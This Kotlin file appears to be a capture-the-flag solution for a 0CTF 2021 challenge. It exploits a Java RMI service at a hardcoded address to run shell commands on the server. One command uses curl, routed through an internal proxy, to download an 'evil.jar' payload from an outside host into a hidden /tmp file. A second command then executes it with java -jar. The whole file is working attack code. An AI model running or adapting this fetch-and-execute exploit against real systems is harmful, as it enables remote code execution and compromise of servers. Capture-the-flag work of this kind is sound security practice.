package soln

import kotlinx.coroutines.delay
import kotlinx.coroutines.runBlocking
import sun.rmi.transport.LiveRef

fun main(): Unit = runBlocking {
    with(solution) {
        val liveRef = lookup()
        writeJar(liveRef)
        delay(5000L)
        clientExec(liveRef)
    }
}

private val solution = Soln("http://111.186.59.2:30051")

private suspend fun Soln.writeJar(liveRef: LiveRef) {
    val bash = "curl -so /tmp/.ccl.jar http://spider:8080/?url=https://tmp.ceclin.top/0ctf-2021-2rm1/evil.jar"
    serverExec(arrayOf("bash", "-c", bash), liveRef)
}

private suspend fun Soln.clientExec(liveRef: LiveRef) {
    serverExec(arrayOf("bash", "-c", "java -jar /tmp/.ccl.jar"), liveRef)
}